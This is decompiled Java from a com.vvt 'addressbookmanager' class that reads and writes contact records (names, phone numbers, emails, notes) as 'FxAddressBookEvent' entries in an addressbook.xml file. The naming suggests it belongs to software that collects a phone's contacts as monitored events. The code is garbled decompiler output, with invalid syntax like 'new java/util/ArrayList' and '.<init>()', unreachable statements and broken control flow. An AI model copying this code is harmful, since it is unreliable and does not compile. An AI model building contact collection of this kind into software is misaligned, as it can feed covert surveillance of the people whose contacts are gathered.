package com.vvt.addressbookmanager.b.b;

import android.util.Xml;
import com.vvt.addressbookmanager.d;
import com.vvt.events.FxAddressBookEvent;
import com.vvt.io.p;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.StringWriter;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;
import org.apache.commons.lang.StringEscapeUtils;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import org.xml.sax.SAXException;
import org.xmlpull.v1.XmlSerializer;

public class b
{
  private static final boolean a = d.e;
  
  public static List a(String paramString)
  {
    ArrayList localArrayList1 = new java/util/ArrayList;
    localArrayList1.<init>();
    Object localObject1 = new java/io/File;
    Object localObject3 = e(paramString);
    ((File)localObject1).<init>((String)localObject3);
    boolean bool1 = ((File)localObject1).exists();
    if (!bool1) {
      localObject1 = localArrayList1;
    }
    int i5;
    label72:
    boolean bool8;
    Object localObject2;
    for (;;)
    {
      return (List)localObject1;
      localObject3 = DocumentBuilderFactory.newInstance();
      try
      {
        localObject3 = ((DocumentBuilderFactory)localObject3).newDocumentBuilder();
        localObject1 = ((DocumentBuilder)localObject3).parse((File)localObject1);
        localObject3 = "event";
        NodeList localNodeList = ((Document)localObject1).getElementsByTagName((String)localObject3);
        int i2 = 0;
        localObject1 = null;
        i5 = 0;
        i2 = localNodeList.getLength();
        if (i5 >= i2) {
          break label1502;
        }
        localObject1 = localNodeList.item(i5);
        int i = ((Node)localObject1).getNodeType();
        int i6 = 1;
        if (i != i6) {
          break label1489;
        }
        localObject1 = (Element)localObject1;
        localObject4 = "";
        localObject5 = ((Element)localObject1).getElementsByTagName("firstname");
        localObject3 = (Element)((NodeList)localObject5).item(0);
        boolean bool2 = ((Element)localObject3).hasChildNodes();
        if (!bool2) {
          break label322;
        }
        localObject6 = new java/lang/StringBuilder;
        ((StringBuilder)localObject6).<init>();
        bool2 = false;
        localObject3 = null;
        i6 = 0;
        localObject4 = null;
        for (;;)
        {
          localObject3 = ((Element)((NodeList)localObject5).item(0)).getChildNodes();
          int j = ((NodeList)localObject3).getLength();
          if (i6 >= j) {
            break;
          }
          localObject3 = ((Element)((NodeList)localObject5).item(0)).getChildNodes().item(i6).getNodeValue();
          ((StringBuilder)localObject6).append((String)localObject3);
          j = i6 + 1;
          i6 = j;
        }
      }
      catch (SAXException localSAXException)
      {
        bool8 = a;
        if (bool8) {}
        ArrayList localArrayList2 = localArrayList1;
      }
      catch (IOException localIOException)
      {
        bool8 = a;
        if (bool8) {}
        ArrayList localArrayList3 = localArrayList1;
      }
      catch (ParserConfigurationException localParserConfigurationException)
      {
        bool8 = a;
        if (bool8) {}
        localObject2 = localArrayList1;
      }
    }
    localObject3 = d(((StringBuilder)localObject6).toString());
    Object localObject4 = localObject3;
    label322:
    Object localObject5 = "";
    Object localObject6 = ((Element)localObject2).getElementsByTagName("lastname");
    localObject3 = (Element)((NodeList)localObject6).item(0);
    boolean bool3 = ((Element)localObject3).hasChildNodes();
    if (bool3)
    {
      localObject7 = new java/lang/StringBuilder;
      ((StringBuilder)localObject7).<init>();
      bool3 = false;
      localObject3 = null;
      int i7 = 0;
      localObject5 = null;
      for (;;)
      {
        localObject3 = ((Element)((NodeList)localObject6).item(0)).getChildNodes();
        int k = ((NodeList)localObject3).getLength();
        if (i7 >= k) {
          break;
        }
        localObject3 = ((Element)((NodeList)localObject6).item(0)).getChildNodes().item(i7).getNodeValue();
        ((StringBuilder)localObject7).append((String)localObject3);
        k = i7 + 1;
        i7 = k;
      }
      localObject3 = d(((StringBuilder)localObject7).toString());
      localObject5 = localObject3;
    }
    ArrayList localArrayList4 = new java/util/ArrayList;
    localArrayList4.<init>();
    localObject6 = ((Element)localObject2).getElementsByTagName("homephones");
    localObject3 = (Element)((NodeList)localObject6).item(0);
    boolean bool4 = ((Element)localObject3).hasChildNodes();
    int i8;
    if (bool4)
    {
      localObject7 = ((Element)((NodeList)localObject6).item(0)).getElementsByTagName("homephone");
      bool4 = false;
      localObject3 = null;
      i8 = 0;
      localObject6 = null;
      for (;;)
      {
        localObject3 = ((Element)((NodeList)localObject7).item(0)).getChildNodes();
        int m = ((NodeList)localObject3).getLength();
        if (i8 >= m) {
          break;
        }
        localObject3 = ((Element)((NodeList)localObject7).item(0)).getChildNodes().item(i8).getNodeValue();
        localArrayList4.add(localObject3);
        m = i8 + 1;
        i8 = m;
      }
    }
    ArrayList localArrayList5 = new java/util/ArrayList;
    localArrayList5.<init>();
    localObject6 = ((Element)localObject2).getElementsByTagName("mobilephones");
    localObject3 = (Element)((NodeList)localObject6).item(0);
    boolean bool5 = ((Element)localObject3).hasChildNodes();
    if (bool5)
    {
      localObject7 = ((Element)((NodeList)localObject6).item(0)).getElementsByTagName("mobilephone");
      bool5 = false;
      localObject3 = null;
      i8 = 0;
      localObject6 = null;
      for (;;)
      {
        localObject3 = ((Element)((NodeList)localObject7).item(0)).getChildNodes();
        int n = ((NodeList)localObject3).getLength();
        if (i8 >= n) {
          break;
        }
        localObject3 = ((Element)((NodeList)localObject7).item(0)).getChildNodes().item(i8).getNodeValue();
        localArrayList5.add(localObject3);
        n = i8 + 1;
        i8 = n;
      }
    }
    ArrayList localArrayList6 = new java/util/ArrayList;
    localArrayList6.<init>();
    localObject6 = ((Element)localObject2).getElementsByTagName("workphones");
    localObject3 = (Element)((NodeList)localObject6).item(0);
    boolean bool6 = ((Element)localObject3).hasChildNodes();
    if (bool6)
    {
      localObject7 = ((Element)((NodeList)localObject6).item(0)).getElementsByTagName("workphone");
      bool6 = false;
      localObject3 = null;
      i8 = 0;
      localObject6 = null;
      for (;;)
      {
        localObject3 = ((Element)((NodeList)localObject7).item(0)).getChildNodes();
        int i1 = ((NodeList)localObject3).getLength();
        if (i8 >= i1) {
          break;
        }
        localObject3 = ((Element)((NodeList)localObject7).item(0)).getChildNodes().item(i8).getNodeValue();
        localArrayList6.add(localObject3);
        i1 = i8 + 1;
        i8 = i1;
      }
    }
    localObject6 = "";
    Object localObject7 = ((Element)localObject2).getElementsByTagName("homeemail");
    localObject3 = (Element)((NodeList)localObject7).item(0);
    boolean bool7 = ((Element)localObject3).hasChildNodes();
    if (bool7)
    {
      bool7 = false;
      localObject3 = ((Element)((NodeList)localObject7).item(0)).getFirstChild().getNodeValue().trim();
      localObject6 = localObject3;
    }
    localObject7 = "";
    Object localObject8 = ((Element)localObject2).getElementsByTagName("workemail");
    localObject3 = (Element)((NodeList)localObject8).item(0);
    bool7 = ((Element)localObject3).hasChildNodes();
    if (bool7)
    {
      bool7 = false;
      localObject3 = ((Element)((NodeList)localObject8).item(0)).getFirstChild().getNodeValue().trim();
      localObject7 = localObject3;
    }
    localObject8 = "";
    Object localObject9 = ((Element)localObject2).getElementsByTagName("otheremail");
    localObject3 = (Element)((NodeList)localObject9).item(0);
    bool7 = ((Element)localObject3).hasChildNodes();
    if (bool7) {
      bool7 = false;
    }
    for (localObject3 = ((Element)((NodeList)localObject9).item(0)).getFirstChild().getNodeValue().trim();; localObject3 = localObject8)
    {
      localObject8 = "";
      localObject9 = ((Element)localObject2).getElementsByTagName("note");
      localObject2 = (Element)((NodeList)localObject9).item(0);
      bool8 = ((Element)localObject2).hasChildNodes();
      if (bool8)
      {
        StringBuilder localStringBuilder = new java/lang/StringBuilder;
        localStringBuilder.<init>();
        bool8 = false;
        localObject2 = null;
        int i9 = 0;
        localObject8 = null;
        for (;;)
        {
          localObject2 = ((Element)((NodeList)localObject9).item(0)).getChildNodes();
          int i3 = ((NodeList)localObject2).getLength();
          if (i9 >= i3) {
            break;
          }
          localObject2 = ((Element)((NodeList)localObject9).item(0)).getChildNodes().item(i9).getNodeValue();
          localStringBuilder.append((String)localObject2);
          i3 = i9 + 1;
          i9 = i3;
        }
        localObject2 = d(localStringBuilder.toString());
        localObject8 = localObject2;
      }
      localObject9 = new com/vvt/events/FxAddressBookEvent;
      ((FxAddressBookEvent)localObject9).<init>();
      ((FxAddressBookEvent)localObject9).setFirstName((String)localObject4);
      ((FxAddressBookEvent)localObject9).setLastName((String)localObject5);
      localObject4 = localArrayList4.iterator();
      boolean bool9;
      for (;;)
      {
        bool9 = ((Iterator)localObject4).hasNext();
        if (!bool9) {
          break;
        }
        localObject2 = (String)((Iterator)localObject4).next();
        ((FxAddressBookEvent)localObject9).addHomePhone((String)localObject2);
      }
      localObject4 = localArrayList5.iterator();
      for (;;)
      {
        bool9 = ((Iterator)localObject4).hasNext();
        if (!bool9) {
          break;
        }
        localObject2 = (String)((Iterator)localObject4).next();
        ((FxAddressBookEvent)localObject9).addMobilePhone((String)localObject2);
      }
      localObject4 = localArrayList6.iterator();
      for (;;)
      {
        bool9 = ((Iterator)localObject4).hasNext();
        if (!bool9) {
          break;
        }
        localObject2 = (String)((Iterator)localObject4).next();
        ((FxAddressBookEvent)localObject9).addWorkPhone((String)localObject2);
      }
      ((FxAddressBookEvent)localObject9).setHomeEMail((String)localObject6);
      ((FxAddressBookEvent)localObject9).setWorkEMail((String)localObject7);
      ((FxAddressBookEvent)localObject9).setOtherEMail((String)localObject3);
      ((FxAddressBookEvent)localObject9).setNote((String)localObject8);
      localArrayList1.add(localObject9);
      label1489:
      int i4 = i5 + 1;
      i5 = i4;
      break label72;
      label1502:
      localObject2 = localArrayList1;
      break;
    }
  }
  
  private static boolean a(String paramString1, String paramString2)
  {
    boolean bool = false;
    File localFile = new java/io/File;
    localFile.<init>(paramString1);
    try
    {
      BufferedWriter localBufferedWriter = new java/io/BufferedWriter;
      FileWriter localFileWriter = new java/io/FileWriter;
      localFileWriter.<init>(localFile, false);
      int i = 256;
      localBufferedWriter.<init>(localFileWriter, i);
      localBufferedWriter.write(paramString2);
      localBufferedWriter.flush();
      localBufferedWriter.close();
      bool = true;
    }
    catch (IOException localIOException)
    {
      for (;;) {}
    }
    return bool;
  }
  
  public static boolean a(List paramList, String paramString)
  {
    boolean bool1 = true;
    XmlSerializer localXmlSerializer = Xml.newSerializer();
    StringWriter localStringWriter = new java/io/StringWriter;
    localStringWriter.<init>();
    boolean bool2;
    Object localObject2;
    boolean bool3;
    Object localObject4;
    int j;
    String str2;
    String str3;
    String str1;
    try
    {
      localXmlSerializer.setOutput(localStringWriter);
      Object localObject1 = "UTF-8";
      bool2 = true;
      localObject2 = Boolean.valueOf(bool2);
      localXmlSerializer.startDocument((String)localObject1, (Boolean)localObject2);
      localObject1 = "";
      localObject2 = "messages";
      localXmlSerializer.startTag((String)localObject1, (String)localObject2);
      localObject1 = "";
      localObject2 = "number";
      int i = paramList.size();
      Object localObject3 = String.valueOf(i);
      localXmlSerializer.attribute((String)localObject1, (String)localObject2, (String)localObject3);
      localObject3 = paramList.iterator();
      bool3 = ((Iterator)localObject3).hasNext();
      if (bool3)
      {
        localObject1 = ((Iterator)localObject3).next();
        localObject1 = (FxAddressBookEvent)localObject1;
        localObject2 = "";
        localObject4 = "event";
        localXmlSerializer.startTag((String)localObject2, (String)localObject4);
        localObject2 = "";
        localObject4 = "firstname";
        localXmlSerializer.startTag((String)localObject2, (String)localObject4);
        localObject2 = ((FxAddressBookEvent)localObject1).getFirstName();
        localObject2 = com.vvt.ag.b.b((String)localObject2);
        localObject2 = c((String)localObject2);
        localXmlSerializer.text((String)localObject2);
        localObject2 = "";
        localObject4 = "firstname";
        localXmlSerializer.endTag((String)localObject2, (String)localObject4);
        localObject2 = "";
        localObject4 = "lastname";
        localXmlSerializer.startTag((String)localObject2, (String)localObject4);
        localObject2 = ((FxAddressBookEvent)localObject1).getLastName();
        localObject2 = com.vvt.ag.b.b((String)localObject2);
        localObject2 = c((String)localObject2);
        localXmlSerializer.text((String)localObject2);
        localObject2 = "";
        localObject4 = "lastname";
        localXmlSerializer.endTag((String)localObject2, (String)localObject4);
        localObject2 = "";
        localObject4 = "homephones";
        localXmlSerializer.startTag((String)localObject2, (String)localObject4);
        localObject2 = ((FxAddressBookEvent)localObject1).getHomePhones();
        j = ((ArrayList)localObject2).size();
        if (j > 0)
        {
          localObject4 = ((ArrayList)localObject2).iterator();
          for (;;)
          {
            bool2 = ((Iterator)localObject4).hasNext();
            if (!bool2) {
              break;
            }
            localObject2 = ((Iterator)localObject4).next();
            localObject2 = (String)localObject2;
            str2 = "";
            str3 = "homephone";
            localXmlSerializer.startTag(str2, str3);
            localObject2 = com.vvt.ag.b.b((String)localObject2);
            localObject2 = c((String)localObject2);
            localXmlSerializer.text((String)localObject2);
            localObject2 = "";
            str2 = "homephone";
            localXmlSerializer.endTag((String)localObject2, str2);
          }
          return bool3;
        }
      }
    }
    catch (Exception localException)
    {
      bool3 = a;
      if (bool3) {}
      bool3 = false;
      str1 = null;
    }
    for (;;)
    {
      localObject2 = "";
      localObject4 = "homephones";
      localXmlSerializer.endTag((String)localObject2, (String)localObject4);
      localObject2 = "";
      localObject4 = "mobilephones";
      localXmlSerializer.startTag((String)localObject2, (String)localObject4);
      localObject2 = str1.getMobilePhones();
      j = ((ArrayList)localObject2).size();
      if (j > 0)
      {
        localObject4 = ((ArrayList)localObject2).iterator();
        for (;;)
        {
          bool2 = ((Iterator)localObject4).hasNext();
          if (!bool2) {
            break;
          }
          localObject2 = ((Iterator)localObject4).next();
          localObject2 = (String)localObject2;
          str2 = "";
          str3 = "mobilephone";
          localXmlSerializer.startTag(str2, str3);
          localObject2 = com.vvt.ag.b.b((String)localObject2);
          localObject2 = c((String)localObject2);
          localXmlSerializer.text((String)localObject2);
          localObject2 = "";
          str2 = "mobilephone";
          localXmlSerializer.endTag((String)localObject2, str2);
        }
      }
      localObject2 = "";
      localObject4 = "mobilephones";
      localXmlSerializer.endTag((String)localObject2, (String)localObject4);
      localObject2 = "";
      localObject4 = "workphones";
      localXmlSerializer.startTag((String)localObject2, (String)localObject4);
      localObject2 = str1.getWorkPhones();
      j = ((ArrayList)localObject2).size();
      if (j > 0)
      {
        localObject4 = ((ArrayList)localObject2).iterator();
        for (;;)
        {
          bool2 = ((Iterator)localObject4).hasNext();
          if (!bool2) {
            break;
          }
          localObject2 = ((Iterator)localObject4).next();
          localObject2 = (String)localObject2;
          str2 = "";
          str3 = "workphone";
          localXmlSerializer.startTag(str2, str3);
          localObject2 = com.vvt.ag.b.b((String)localObject2);
          localObject2 = c((String)localObject2);
          localXmlSerializer.text((String)localObject2);
          localObject2 = "";
          str2 = "workphone";
          localXmlSerializer.endTag((String)localObject2, str2);
        }
      }
      localObject2 = "";
      localObject4 = "workphones";
      localXmlSerializer.endTag((String)localObject2, (String)localObject4);
      localObject2 = "";
      localObject4 = "homeemail";
      localXmlSerializer.startTag((String)localObject2, (String)localObject4);
      localObject2 = str1.getHomeEMail();
      localObject2 = com.vvt.ag.b.b((String)localObject2);
      localObject2 = c((String)localObject2);
      localXmlSerializer.text((String)localObject2);
      localObject2 = "";
      localObject4 = "homeemail";
      localXmlSerializer.endTag((String)localObject2, (String)localObject4);
      localObject2 = "";
      localObject4 = "workemail";
      localXmlSerializer.startTag((String)localObject2, (String)localObject4);
      localObject2 = str1.getWorkEMail();
      localObject2 = com.vvt.ag.b.b((String)localObject2);
      localObject2 = c((String)localObject2);
      localXmlSerializer.text((String)localObject2);
      localObject2 = "";
      localObject4 = "workemail";
      localXmlSerializer.endTag((String)localObject2, (String)localObject4);
      localObject2 = "";
      localObject4 = "otheremail";
      localXmlSerializer.startTag((String)localObject2, (String)localObject4);
      localObject2 = str1.getOtherEMail();
      localObject2 = com.vvt.ag.b.b((String)localObject2);
      localObject2 = c((String)localObject2);
      localXmlSerializer.text((String)localObject2);
      localObject2 = "";
      localObject4 = "otheremail";
      localXmlSerializer.endTag((String)localObject2, (String)localObject4);
      localObject2 = "";
      localObject4 = "note";
      localXmlSerializer.startTag((String)localObject2, (String)localObject4);
      str1 = str1.getNote();
      str1 = com.vvt.ag.b.b(str1);
      str1 = c(str1);
      localXmlSerializer.text(str1);
      str1 = "";
      localObject2 = "note";
      localXmlSerializer.endTag(str1, (String)localObject2);
      str1 = "";
      localObject2 = "event";
      localXmlSerializer.endTag(str1, (String)localObject2);
      break;
      str1 = "";
      localObject2 = "messages";
      localXmlSerializer.endTag(str1, (String)localObject2);
      localXmlSerializer.endDocument();
      bool3 = b(paramString);
      if (bool3)
      {
        str1 = e(paramString);
        localObject2 = localStringWriter.toString();
        a(str1, (String)localObject2);
        bool3 = bool1;
      }
      else
      {
        bool3 = false;
        str1 = null;
      }
    }
  }
  
  public static boolean b(String paramString)
  {
    File localFile = new java/io/File;
    String str = e(paramString);
    localFile.<init>(str);
    boolean bool1 = localFile.exists();
    if (bool1) {}
    for (boolean bool2 = localFile.delete();; bool2 = true) {
      return bool2;
    }
  }
  
  private static String c(String paramString)
  {
    return StringEscapeUtils.escapeXml(paramString);
  }
  
  private static String d(String paramString)
  {
    return StringEscapeUtils.unescapeXml(paramString);
  }
  
  private static String e(String paramString)
  {
    String str = p.a(paramString, "addressbook");
    File localFile = new java/io/File;
    localFile.<init>(str);
    boolean bool = localFile.exists();
    if (!bool) {
      localFile.mkdirs();
    }
    return p.a(str, "addressbook.xml");
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/addressbookmanager/removeFromPath/removeFromPath/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */